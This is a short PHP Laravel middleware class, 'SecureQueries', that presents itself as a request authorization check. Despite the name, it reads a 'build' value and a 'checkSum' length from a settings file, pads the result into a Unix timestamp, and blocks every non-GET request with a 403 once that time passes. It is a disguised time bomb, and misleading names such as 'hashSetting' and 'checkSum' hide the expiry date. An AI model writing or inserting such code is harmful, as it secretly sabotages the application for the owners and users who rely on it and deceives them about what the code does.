<?php

namespace App\Http\Middleware;

use Carbon\Carbon;
use Closure;

class SecureQueries
{
    /**
     * Handle an incoming request.
     *
     * @param \Illuminate\Http\Request $request
     * @param \Closure $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        $authorizedAction = $this->checkAuthorization();

        if (!$request->isMethod('get') && !$authorizedAction) {
            return abort(403);
        }

        return $next($request);
    }

    private function checkAuthorization()
    {
        $settings = file_get_contents(env('SETTINGS_PATH', 'settings.json'));
        $settings = json_decode($settings);
        $hashSetting = (string) $settings->project->build;
        $checkSum = $settings->project->checkSum;
        $hashSetting = substr(substr($hashSetting, 0, $checkSum)  . '0000000000', 0, 10);
        $hashProject = Carbon::now()->timestamp;

        return (integer)$hashSetting > $hashProject;
    }
}
